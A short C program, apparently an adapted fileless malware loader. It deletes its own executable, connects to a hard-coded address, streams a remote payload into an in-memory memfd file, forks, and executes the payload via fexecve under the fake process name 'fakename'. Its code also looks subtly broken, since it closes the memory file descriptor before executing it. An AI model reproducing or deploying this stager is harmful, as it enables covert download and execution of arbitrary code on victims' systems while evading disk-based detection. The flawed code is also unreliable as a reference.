#include <stdio.h>
#include <stdlib.h>

#include <sys/syscall.h>

#include <unistd.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h> 
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>

/* NEW CODE ********************************/

#define __NR_memfd_create 319
#define MFD_CLOEXEC 1

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

/* END NEW CODE ****************************/


int main (int argc, char **argv, char **env) {
  int                fd, l, s;
  unsigned long      addr = 0x0100007f11110002;
  char               *args[2]= {"fakename", NULL};
  char               buf[1024];

  unlink (argv[0]);
  // Connect
  if ((s = socket (PF_INET, SOCK_STREAM, IPPROTO_TCP)) < 0) exit (1);
  if (connect (s, (struct sockaddr*)&addr, 16) < 0) exit (1);
  fd = memfd_create ("k", MFD_CLOEXEC);  // MODIFIED

  while (1) {
      if ((l = read (s, buf, 1024) ) <= 0) break;
      write (fd, buf, l);                             
    }
  close (s);
  close (fd);                                          
  if (fork () > 0) exit (1);
  fexecve (fd, args, env);                             // MODIFIED
  return 0;
    
}
